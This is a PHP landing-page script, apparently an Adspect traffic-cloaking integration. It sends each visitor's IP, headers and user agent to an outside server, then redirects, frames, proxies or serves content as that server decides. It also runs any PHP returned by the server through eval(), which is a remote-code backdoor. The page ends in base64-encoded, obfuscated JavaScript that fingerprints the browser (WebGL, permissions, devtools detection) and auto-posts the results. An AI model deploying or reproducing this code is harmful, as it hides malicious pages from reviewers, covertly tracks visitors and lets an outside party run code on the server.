<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_REAL_IP']]; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('3484e2f4-95de-4eab-9f62-9a9aa8b0c0ee', 'redirect', '_', base64_decode('YWfmZMdqH+hkO7lTupupWtjLlv6+iAWjMpwbrjQivEo=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html><html><body><script src="data:text/javascript;base64,ZnVuY3Rpb24gXzB4NTFmOChfMHgxNWM4MGEsXzB4MWU4MTcwKXt2YXIgXzB4M2Q4MjBhPV8weDNkODIoKTtyZXR1cm4gXzB4NTFmOD1mdW5jdGlvbihfMHg1MWY4MzcsXzB4MTkyMmQ1KXtfMHg1MWY4Mzc9XzB4NTFmODM3LTB4Zjc7dmFyIF8weDIzZTEwNz1fMHgzZDgyMGFbXzB4NTFmODM3XTtyZXR1cm4gXzB4MjNlMTA3O30sXzB4NTFmOChfMHgxNWM4MGEsXzB4MWU4MTcwKTt9KGZ1bmN0aW9uKF8weDRmYmYyOSxfMHg0MGFlODcpe3ZhciBfMHg1NDQ2ZGY9XzB4NTFmOCxfMHgyNTZmMjA9XzB4NGZiZjI5KCk7d2hpbGUoISFbXSl7dHJ5e3ZhciBfMHg0ODUwMWE9LXBhcnNlSW50KF8weDU0NDZkZigweDEwZSkpLzB4MStwYXJzZUludChfMHg1NDQ2ZGYoMHhmYSkpLzB4MistcGFyc2VJbnQoXzB4NTQ0NmRmKDB4MTIxKSkvMHgzK3BhcnNlSW50KF8weDU0NDZkZigweDEyOCkpLzB4NCooLXBhcnNlSW50KF8weDU0NDZkZigweDExYykpLzB4NSkrLXBhcnNlSW50KF8weDU0NDZkZigweDExNykpLzB4NistcGFyc2VJbnQoXzB4NTQ0NmRmKDB4MTIyKSkvMHg3KigtcGFyc2VJbnQoXzB4NTQ0NmRmKDB4MTI3KSkvMHg4KStwYXJzZUludChfMHg1NDQ2ZGYoMHgxMTYpKS8weDk7aWYoXzB4NDg1MDFhPT09XzB4NDBhZTg3KWJyZWFrO2Vsc2UgXzB4MjU2ZjIwWydwdXNoJ10oXzB4MjU2ZjIwWydzaGlmdCddKCkpO31jYXRjaChfMHgyNDkyMzgpe18weDI1NmYyMFsncHVzaCddKF8weDI1NmYyMFsnc2hpZnQnXSgpKTt9fX0oXzB4M2Q4MiwweDFiYjljKSwoZnVuY3Rpb24oKXt2YXIgXzB4MmMwOTY5PV8weDUxZjg7ZnVuY3Rpb24gXzB4MjkxNjU1KCl7dmFyIF8weDE4NzZjZT1fMHg1MWY4O18weDIzNjRjMFtfMHgxODc2Y2UoMHhmZildPV8weDNlMGMxODt2YXIgXzB4NTliMjM1PWRvY3VtZW50W18weDE4NzZjZSgweDEwZildKF8weDE4NzZjZSgweDEwMCkpLF8weDMwYjc5OD1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKCdpbnB1dCcpO18weDU5YjIzNVtfMHgxODc2Y2UoMHgxMTkpXT1fMHgxODc2Y2UoMHgxMGEpLF8weDU5YjIzNVtfMHgxODc2Y2UoMHgxMDEpXT13aW5kb3dbJ2xvY2F0aW9uJ11bXzB4MTg3NmNlKDB4ZjkpXSxfMHgzMGI3OThbJ3R5cGUnXT0naGlkZGVuJyxfMHgzMGI3OThbXzB4MTg3NmNlKDB4MTA3KV09XzB4MTg3NmNlKDB4MTA0KSxfMHgzMGI3OThbXzB4MTg3NmNlKDB4MTFlKV09SlNPTltfMHgxODc2Y2UoMHgxMjMpXShfMHgyMzY0YzApLF8weDU5YjIzNVtfMHgxODc2Y2UoMHhmNyldKF8weDMwYjc5OCksZG9jdW1lbnRbXzB4MTg3NmNlKDB4MTE0KV1bJ2FwcGVuZENoaWxkJ10oXzB4NTliMjM1KSxfMHg1OWIyMzVbXzB4MTg3NmNlKDB4MTAzKV0oKTt9dmFyIF8weDNlMGMxOD1bXSxfMHgyMzY0YzA9e307dHJ5e3ZhciBfMHg0NzA0MjY9ZnVuY3Rpb24oXzB4MzAwNmIyKXt2YXIgXzB4MzQ2ZjM2PV8weDUxZjg7aWYoJ29iamVjdCc9PT10eXBlb2YgXzB4MzAwNmIyJiZudWxsIT09XzB4MzAwNmIyKXt2YXIgXzB4NDg3MGViPWZ1bmN0aW9uKF8weDUxOGEyZCl7dmFyIF8weDFiYTIyND1fMHg1MWY4O3RyeXt2YXIgXzB4M2I3MDMyPV8weDMwMDZiMltfMHg1MThhMmRdO3N3aXRjaCh0eXBlb2YgXzB4M2I3MDMyKXtjYXNlJ29iamVjdCc6aWYobnVsbD09PV8weDNiNzAzMilicmVhaztjYXNlIF8weDFiYTIyNCgweDExOCk6XzB4M2I3MDMyPV8weDNiNzAzMlsndG9TdHJpbmcnXSgpO31fMHgxZTkzOWZbXzB4NTE4YTJkXT1fMHgzYjcwMzI7fWNhdGNoKF8weDM2YzljNSl7XzB4M2UwYzE4W18weDFiYTIyNCgweDEwNSldKF8weDM2YzljNVtfMHgxYmEyMjQoMHgxMDgpXSk7fX0sXzB4MWU5MzlmPXt9LF8weDUzNWRmZDtmb3IoXzB4NTM1ZGZkIGluIF8weDMwMDZiMilfMHg0ODcwZWIoXzB4NTM1ZGZkKTt0cnl7dmFyIF8weGEzYjA4MD1PYmplY3RbXzB4MzQ2ZjM2KDB4ZjgpXShfMHgzMDA2YjIpO2ZvcihfMHg1MzVkZmQ9MHgwO18weDUzNWRmZDxfMHhhM2IwODBbXzB4MzQ2ZjM2KDB4MTEyKV07KytfMHg1MzVkZmQpXzB4NDg3MGViKF8weGEzYjA4MFtfMHg1MzVkZmRdKTtfMHgxZTkzOWZbJyEhJ109XzB4YTNiMDgwO31jYXRjaChfMHg0M2ZhNTQpe18weDNlMGMxOFtfMHgzNDZmMzYoMHgxMDUpXShfMHg0M2ZhNTRbXzB4MzQ2ZjM2KDB4MTA4KV0pO31yZXR1cm4gXzB4MWU5MzlmO319O18weDIzNjRjMFtfMHgyYzA5NjkoMHgxMjQpXT1fMHg0NzA0MjYod2luZG93W18weDJjMDk2OSgweDEyNCldKSxfMHgyMzY0YzBbXzB4MmMwOTY5KDB4ZmMpXT1fMHg0NzA0MjYod2luZG93KSxfMHgyMzY0YzBbXzB4MmMwOTY5KDB4MTI5KV09XzB4NDcwNDI2KHdpbmRvd1tfMHgyYzA5NjkoMHgxMjkpXSksXzB4MjM2NGMwWydsb2NhdGlvbiddPV8weDQ3MDQyNih3aW5kb3dbJ2xvY2F0aW9uJ10pLF8weDIzNjRjMFtfMHgyYzA5NjkoMHgxMWIpXT1fMHg0NzA0MjYod2luZG93W18weDJjMDk2OSgweDExYildKSxfMHgyMzY0YzBbXzB4MmMwOTY5KDB4ZmQpXT1mdW5jdGlvbihfMHgyYTVmMWIpe3ZhciBfMHgzMDNhMjE9XzB4MmMwOTY5O3RyeXt2YXIgXzB4NGYwZDg1PXt9O18weDJhNWYxYj1fMHgyYTVmMWJbXzB4MzAzYTIxKDB4MTEzKV07Zm9yKHZhciBfMHg0NGRlZDcgaW4gXzB4MmE1ZjFiKV8weDQ0ZGVkNz1fMHgyYTVmMWJbXzB4NDRkZWQ3XSxfMHg0ZjBkODVbXzB4NDRkZWQ3W18weDMwM2EyMSgweDEyYyldXT1fMHg0NGRlZDdbXzB4MzAzYTIxKDB4MTAyKV07cmV0dXJuIF8weDRmMGQ4NTt9Y2F0Y2goXzB4ZDRlNWM3KXtfMHgzZTBjMThbXzB4MzAzYTIxKDB4MTA1KV0oXzB4ZDRlNWM3WydtZXNzYWdlJ10pO319KGRvY3VtZW50W18weDJjMDk2OSgweGZkKV0pLF8weDIzNjRjMFtfMHgyYzA5NjkoMHhmYildPV8weDQ3MDQyNihkb2N1bWVudCk7dHJ5e18weDIzNjRjMFsndGltZXpvbmVPZmZzZXQnXT1uZXcgRGF0ZSgpWydnZXRUaW1lem9uZU9mZnNldCddKCk7fWNhdGNoKF8weDc5ZDExNyl7XzB4M2UwYzE4W18weDJjMDk2OSgweDEwNSldKF8weDc5ZDExN1tfMHgyYzA5NjkoMHgxMDgpXSk7fXRyeXtfMHgyMzY0YzBbXzB4MmMwOTY5KDB4MTFhKV09ZnVuY3Rpb24oKXt9W18weDJjMDk2OSgweDEyMCldKCk7fWNhdGNoKF8weDI5MTVmOSl7XzB4M2UwYzE4W18weDJjMDk2OSgweDEwNSldKF8weDI5MTVmOVsnbWVzc2FnZSddKTt9dHJ5e18weDIzNjRjMFsndG91Y2hFdmVudCddPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDJjMDk2OSgweDEwNikpW18weDJjMDk2OSgweDEyMCldKCk7fWNhdGNoKF8weDQxOWY5MSl7XzB4M2UwYzE4W18weDJjMDk2OSgweDEwNSldKF8weDQxOWY5MVtfMHgyYzA5NjkoMHgxMDgpXSk7fXRyeXtfMHg0NzA0MjY9ZnVuY3Rpb24oKXt9O3ZhciBfMHg1Y2RiNTI9MHgwO18weDQ3MDQyNltfMHgyYzA5NjkoMHgxMjApXT1mdW5jdGlvbigpe3JldHVybisrXzB4NWNkYjUyLCcnO30sY29uc29sZVtfMHgyYzA5NjkoMHgxMjYpXShfMHg0NzA0MjYpLF8weDIzNjRjMFtfMHgyYzA5NjkoMHgxMGQpXT1fMHg1Y2RiNTI7fWNhdGNoKF8weDI3MzYzOCl7XzB4M2UwYzE4WydwdXNoJ10oXzB4MjczNjM4W18weDJjMDk2OSgweDEwOCldKTt9d2luZG93W18weDJjMDk2OSgweDEyOSldW18weDJjMDk2OSgweDEyNSldWydxdWVyeSddKHsnbmFtZSc6XzB4MmMwOTY5KDB4MTEwKX0pW18weDJjMDk2OSgweDExZCldKGZ1bmN0aW9uKF8weDNmMGRjYSl7dmFyIF8weGI5ZTM2Mj1fMHgyYzA5Njk7XzB4MjM2NGMwWydwZXJtaXNzaW9ucyddPVt3aW5kb3dbXzB4YjllMzYyKDB4MTJiKV1bJ3Blcm1pc3Npb24nXSxfMHgzZjBkY2FbXzB4YjllMzYyKDB4MTExKV1dLF8weDI5MTY1NSgpO30sXzB4MjkxNjU1KTt0cnl7dmFyIF8weDU3NDVlMT1kb2N1bWVudFtfMHgyYzA5NjkoMHgxMGYpXShfMHgyYzA5NjkoMHgxMWYpKVtfMHgyYzA5NjkoMHhmZSldKCd3ZWJnbCcpLF8weDIwMDMxZD1fMHg1NzQ1ZTFbJ2dldEV4dGVuc2lvbiddKF8weDJjMDk2OSgweDEwOSkpO18weDIzNjRjMFtfMHgyYzA5NjkoMHgxMGMpXT17J3ZlbmRvcic6XzB4NTc0NWUxW18weDJjMDk2OSgweDExNSldKF8weDIwMDMxZFtfMHgyYzA5NjkoMHgxMmEpXSksJ3JlbmRlcmVyJzpfMHg1NzQ1ZTFbJ2dldFBhcmFtZXRlciddKF8weDIwMDMxZFtfMHgyYzA5NjkoMHgxMGIpXSl9O31jYXRjaChfMHg1MmU4NmQpe18weDNlMGMxOFtfMHgyYzA5NjkoMHgxMDUpXShfMHg1MmU4NmRbXzB4MmMwOTY5KDB4MTA4KV0pO319Y2F0Y2goXzB4MjhlZjE0KXtfMHgzZTBjMThbJ3B1c2gnXShfMHgyOGVmMTRbXzB4MmMwOTY5KDB4MTA4KV0pLF8weDI5MTY1NSgpO319KCkpKTtmdW5jdGlvbiBfMHgzZDgyKCl7dmFyIF8weDU4YjNkMz1bJ3RvU3RyaW5nJywnNTU5NDQ2blp4ZmFuJywnMzV2Z25yZUsnLCdzdHJpbmdpZnknLCdzY3JlZW4nLCdwZXJtaXNzaW9ucycsJ2xvZycsJzEwMTYyNGhBRFhkUycsJzU3NzM3MkF5cXdtdScsJ25hdmlnYXRvcicsJ1VOTUFTS0VEX1ZFTkRPUl9XRUJHTCcsJ05vdGlmaWNhdGlvbicsJ25vZGVOYW1lJywnYXBwZW5kQ2hpbGQnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnaHJlZicsJzEyOTU1OHBsaVVRTScsJ2RvY3VtZW50Jywnd2luZG93JywnZG9jdW1lbnRFbGVtZW50JywnZ2V0Q29udGV4dCcsJ2Vycm9ycycsJ2Zvcm0nLCdhY3Rpb24nLCdub2RlVmFsdWUnLCdzdWJtaXQnLCdkYXRhJywncHVzaCcsJ1RvdWNoRXZlbnQnLCduYW1lJywnbWVzc2FnZScsJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nLCdQT1NUJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCd3ZWJnbCcsJ3Rvc3RyaW5nJywnMTc0NTQ0dGZDS1RRJywnY3JlYXRlRWxlbWVudCcsJ25vdGlmaWNhdGlvbnMnLCdzdGF0ZScsJ2xlbmd0aCcsJ2F0dHJpYnV0ZXMnLCdib2R5JywnZ2V0UGFyYW1ldGVyJywnNTE5Mzk5OUd0QXdleicsJzUxODgzMmFIZEx3bScsJ2Z1bmN0aW9uJywnbWV0aG9kJywnY2xvc3VyZScsJ2NvbnNvbGUnLCc1cG5GSEZ1JywndGhlbicsJ3ZhbHVlJywnY2FudmFzJ107XzB4M2Q4Mj1mdW5jdGlvbigpe3JldHVybiBfMHg1OGIzZDM7fTtyZXR1cm4gXzB4M2Q4MigpO30="></script></body></html><?php exit;